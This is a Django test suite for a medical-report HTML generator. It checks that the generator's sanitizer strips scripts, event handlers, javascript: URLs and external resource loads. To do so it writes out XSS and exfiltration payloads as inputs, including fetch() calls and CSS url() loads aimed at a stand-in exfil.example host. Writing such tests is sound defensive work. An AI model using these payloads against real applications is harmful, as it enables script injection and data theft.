from django.conf import settings
from django.test import SimpleTestCase, override_settings
from tinyhtml5 import parse

from care.emr.reports.renderer.generators.html_generator import (
    HTMLGenerator,
    HTMLGeneratorOptions,
)

INLINE_IMAGE = (
    "data:image/png;base64,"
    "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mP8/x8AAwMCAO+/l9sAAAAASUVORK5CYII="
)
IMAGE_ORIGIN = "https://assets.example"
REMOTE_IMAGE = f"{IMAGE_ORIGIN}/logo.png"


class ReportHTMLSecurityTests(SimpleTestCase):
    def setUp(self):
        self.generator = HTMLGenerator()

    @override_settings(REPORT_ALLOWED_RESOURCE_ORIGINS=[IMAGE_ORIGIN])
    def test_preserves_images_from_configured_https_origins(self):
        result = self.generator.generate(
            f'<img src="{REMOTE_IMAGE}" onerror="alert(1)" srcset="{REMOTE_IMAGE} 2x">'
        ).decode()
        image = parse(result, namespace_html_elements=False).find(".//img")
        self.assertEqual(image.attrib, {"src": REMOTE_IMAGE})

    @override_settings(REPORT_ALLOWED_RESOURCE_ORIGINS=[IMAGE_ORIGIN])
    def test_configured_image_origins_require_an_exact_match(self):
        for url in (
            REMOTE_IMAGE.replace("https:", "http:"),
            REMOTE_IMAGE.removeprefix("https:"),
            REMOTE_IMAGE.replace(IMAGE_ORIGIN, IMAGE_ORIGIN + ".evil.example"),
            REMOTE_IMAGE.replace(IMAGE_ORIGIN, IMAGE_ORIGIN + ":444"),
            REMOTE_IMAGE.replace("https://", "https://user:password@"),
            IMAGE_ORIGIN + "@evil.example/logo.png",
            IMAGE_ORIGIN + "\\@evil.example/logo.png",
            REMOTE_IMAGE.replace("https://", "https://\n"),
        ):
            with self.subTest(url=url):
                result = self.generator.generate(f'<img src="{url}">').decode()
                image = parse(result, namespace_html_elements=False).find(".//img")
                self.assertIsNone(image.get("src"))

    @override_settings(REPORT_ALLOWED_RESOURCE_ORIGINS=[IMAGE_ORIGIN + "/images"])
    def test_path_configuration_does_not_trust_an_entire_origin(self):
        result = self.generator.generate(f'<img src="{REMOTE_IMAGE}">').decode()
        self.assertIsNone(
            parse(result, namespace_html_elements=False).find(".//img").get("src")
        )

    @override_settings(REPORT_ALLOWED_RESOURCE_ORIGINS=[IMAGE_ORIGIN])
    def test_preserves_trusted_stylesheet_links_and_only_passive_attributes(self):
        url = f"{IMAGE_ORIGIN}/report.css"
        result = self.generator.generate(
            f'<link rel="stylesheet" href="{url}" media="print" type="text/css" '
            'crossorigin="anonymous" onload="alert(1)">'
        ).decode()
        link = parse(result, namespace_html_elements=False).find(".//link")
        self.assertEqual(
            link.attrib,
            {
                "rel": "stylesheet",
                "href": url,
                "media": "print",
                "type": "text/css",
                "crossorigin": "anonymous",
            },
        )

    @override_settings(REPORT_ALLOWED_RESOURCE_ORIGINS=[IMAGE_ORIGIN])
    def test_untrusted_stylesheets_and_other_link_types_are_removed(self):
        for rel, url in (
            ("stylesheet", "https://untrusted.example/report.css"),
            ("stylesheet", "file:///etc/report.css"),
            ("stylesheet", "//untrusted.example/report.css"),
            ("stylesheet", "data:text/css,p{}"),
            ("attachment", f"{IMAGE_ORIGIN}/secret"),
            ("prefetch", f"{IMAGE_ORIGIN}/report.css"),
            ("preload", f"{IMAGE_ORIGIN}/report.css"),
            ("stylesheet attachment", f"{IMAGE_ORIGIN}/report.css"),
        ):
            with self.subTest(rel=rel, url=url):
                result = self.generator.generate(f'<link rel="{rel}" href="{url}">')
                self.assertEqual(
                    list(
                        parse(result.decode(), namespace_html_elements=False).iter(
                            "link"
                        )
                    ),
                    [],
                )

    @override_settings(REPORT_ALLOWED_RESOURCE_ORIGINS=[IMAGE_ORIGIN])
    def test_preserves_trusted_css_imports_font_sources_and_backgrounds(self):
        urls = {
            "stylesheet": f"{IMAGE_ORIGIN}/report.css",
            "font": f"{IMAGE_ORIGIN}/report.woff2",
            "background": f"{IMAGE_ORIGIN}/background.png",
        }
        for css in (
            f'@import "{urls["stylesheet"]}";',
            f"@import url({urls['stylesheet']}) print;",
            f'@import u\\72l("{urls["stylesheet"]}") layer(report) supports(display: grid);',
            (
                '@font-face {font-family: Report; src: local("Report"), '
                f'url("{urls["font"]}") format("woff2");}}'
            ),
            f'@media print {{p {{background: url("{urls["background"]}")}}}}',
            f'p {{--image: url("{urls["background"]}"); background: var(--image)}}',
        ):
            with self.subTest(css=css):
                result = self.generator.generate(f"<style>{css}</style>").decode()
                self.assertIn(next(url for url in urls.values() if url in css), result)
        result = self.generator.generate(
            f'<p style="background: url({urls["background"]}); color: red">Report</p>'
        ).decode()
        self.assertIn(urls["background"], result)
        self.assertIn("color: red", result)

    @override_settings(REPORT_ALLOWED_RESOURCE_ORIGINS=[IMAGE_ORIGIN])
    def test_css_urls_cannot_use_untrusted_origins_or_active_data_types(self):
        for url in (
            "https://untrusted.example/resource",
            "file:///etc/passwd",
            "//untrusted.example/resource",
            "javascript:alert(1)",
            "data:text/html,secret",
            "data:image/svg+xml,secret",
            IMAGE_ORIGIN + ".untrusted.example/resource",
        ):
            for css in (
                f'@import "{url}";',
                f'@import u\\72l("{url}");',
                f'p {{background: u\\72l("{url}")}}',
                f'@font-face {{font-family: Report; src: url("{url}") format("woff2");}}',
                f'p {{background: url("{REMOTE_IMAGE}"), url("{url}")}}',
            ):
                with self.subTest(url=url, css=css):
                    result = self.generator.generate(f"<style>{css}</style>").decode()
                    self.assertNotIn(url, result)

    def test_css_allows_embedded_images_and_fonts(self):
        font = "data:font/woff2;base64,dGVzdA=="
        result = self.generator.generate(
            f'<style>@font-face {{font-family:Report; src:url("{font}") format("woff2");}}'
            f'p {{background:url("{INLINE_IMAGE}")}}</style>'
        ).decode()
        self.assertIn(font, result)
        self.assertIn(INLINE_IMAGE, result)

    def test_removes_external_resource_attributes_and_active_markup(self):
        url = "https://exfil.example/secret"
        html = f"""
            <base href="{url}">
            <meta http-equiv="refresh" content="0;url={url}">
            <link rel="stylesheet" href="{url}">
            <script src="{url}">fetch('{url}')</script>
            <iframe src="{url}" srcdoc="&lt;img src='{url}'&gt;"></iframe>
            <object data="{url}"></object>
            <form action="{url}"><input type="image" src="{url}"></form>
            <svg><image href="{url}" /></svg>
            <math><mtext><img src="{url}"></mtext></math>
            <table background="{url}"><tr><td>Report</td></tr></table>
            <img src="{url}" srcset="{url} 2x" onerror="fetch('{url}')">
            <a href="#report" ping="{url}">Report</a>
        """
        result = self.generator.generate(html).decode()
        self.assertNotIn(url, result)
        self.assertNotIn("onerror", result)
        self.assertNotIn("srcdoc", result)
        self.assertIn("Report", result)

    def test_css_cannot_fetch_resources_including_escaped_or_string_urls(self):
        url = "https://exfil.example/secret"
        styles = [
            f'@import "{url}";',
            f'@import url("{url}");',
            f'p {{background: url("{url}")}}',
            f'p {{background: u\\72l("{url}")}}',
            f'p {{background: image-set("{url}" 1x)}}',
            f'p {{background: -webkit-image-set("{url}" 1x)}}',
            f'p {{background: src("{url}")}}',
            f'@font-face {{font-family: remote; src: url("{url}")}}',
            f'@media print {{p {{background: url("{url}")}}}}',
            f'p {{--resource: url("{url}"); background: var(--resource)}}',
            f'p {{& span {{background: url("{url}")}}}}',
        ]
        for style in styles:
            with self.subTest(style=style):
                result = self.generator.generate(f"<style>{style}</style><p>Report</p>")
                self.assertNotIn(url.encode(), result)
                self.assertIn(b"Report", result)
        result = self.generator.generate(
            f'<p style="color:red; background: url({url})">Report</p>'
        )
        self.assertNotIn(url.encode(), result)
        self.assertIn(b"color:red", result)

    def test_preserves_report_layout_inline_images_and_intentional_links(self):
        html = f"""
            <style>
                @page {{ size: A4; margin: 1cm;
                    @bottom-center {{ content: counter(page); }}
                }}
                @media print {{ p {{ color: rgb(0, 0, 0); }} }}
                td:nth-child(2) {{ width: calc(100% - 1cm); }}
            </style>
            <h1 id="report">Report</h1>
            <table><tr><td colspan="2" style="padding:4px">Clinical details</td></tr></table>
            <img src="{INLINE_IMAGE}" alt="Logo">
            <a href="https://care.example/download/report">Download</a>
        """
        result = self.generator.generate(html).decode()
        root = parse(result, namespace_html_elements=False)
        self.assertEqual(root.find(".//img").get("src"), INLINE_IMAGE)
        self.assertEqual(root.find(".//td").get("colspan"), "2")
        self.assertEqual(root.find(".//td").get("style"), "padding:4px;")
        self.assertIn("Clinical details", result)
        for css in (
            "@page",
            "@bottom-center",
            "counter(page)",
            "rgb(0, 0, 0)",
            "calc(",
        ):
            self.assertIn(css, result)
        self.assertIn('href="https://care.example/download/report"', result)

    def test_only_raster_data_images_and_safe_link_schemes_are_kept(self):
        for url in (
            "file:///etc/passwd",
            "//exfil.example/secret",
            "/private-resource",
            "data:image/svg+xml,<svg></svg>",
            "data:text/html,<script>alert(1)</script>",
            "javascript:alert(1)",
        ):
            with self.subTest(url=url):
                result = self.generator.generate(f'<img src="{url}">').decode()
                self.assertIsNone(
                    parse(result, namespace_html_elements=False)
                    .find(".//img")
                    .get("src")
                )
        for url in ("javascript:alert(1)", "java\nscript:alert(1)", "data:text/html,x"):
            with self.subTest(link=url):
                result = self.generator.generate(f'<a href="{url}">Click</a>').decode()
                self.assertIsNone(
                    parse(result, namespace_html_elements=False)
                    .find(".//a")
                    .get("href")
                )

    def test_css_strings_cannot_break_out_when_html_is_parsed_again(self):
        html = """
            <p style='--label: "</style><img src=https://exfil.example/secret>";'>Report</p>
            <style>p::after { content: "&lt;/style&gt;"; }</style>
        """
        result = self.generator.generate(html).decode()
        # Reparse the serialized document, as the browser preview does.
        root = parse(result, namespace_html_elements=False)
        self.assertEqual(list(root.iter("img")), [])
        self.assertIn("Report", result)

    def test_csp_is_carried_in_saved_html_and_response_headers(self):
        content = self.generator.generate(
            '<meta http-equiv="Content-Security-Policy" content="default-src *">'
            "<p>Report</p>"
        )
        root = parse(content.decode(), namespace_html_elements=False)
        metas = root.findall("./head/meta")
        self.assertEqual(metas[0].get("charset"), "utf-8")
        self.assertEqual(
            metas[1].get("content"), settings.REPORT_CONTENT_SECURITY_POLICY
        )
        self.assertEqual(len(metas), 2)
        response = self.generator.get_http_response(content)
        self.assertEqual(
            response["Content-Security-Policy"], settings.REPORT_CONTENT_SECURITY_POLICY
        )
        self.assertEqual(response["X-Content-Type-Options"], "nosniff")

    def test_configured_csp_is_used_in_saved_html_and_response_headers(self):
        policy = (
            "default-src 'none'; img-src data: "
            f"{IMAGE_ORIGIN}; style-src 'unsafe-inline'"
        )
        with override_settings(
            REPORT_ALLOWED_RESOURCE_ORIGINS=[IMAGE_ORIGIN],
            REPORT_CONTENT_SECURITY_POLICY=policy,
        ):
            content = self.generator.generate(f'<img src="{REMOTE_IMAGE}">')
            root = parse(content.decode(), namespace_html_elements=False)
            self.assertEqual(root.find(".//img").get("src"), REMOTE_IMAGE)
            meta = root.find("./head/meta[@http-equiv='Content-Security-Policy']")
            self.assertEqual(meta.get("content"), policy)
            response = self.generator.get_http_response(content)
            self.assertEqual(response["Content-Security-Policy"], policy)

    def test_wrapped_document_options_are_escaped(self):
        result = self.generator.generate(
            "<p>Report</p>",
            HTMLGeneratorOptions(
                wrap_document=True, title="</title><img src='https://exfil.example'>"
            ),
        ).decode()
        root = parse(result, namespace_html_elements=False)
        self.assertEqual(list(root.iter("img")), [])
        self.assertEqual(
            root.find("./head/title").text, "</title><img src='https://exfil.example'>"
        )
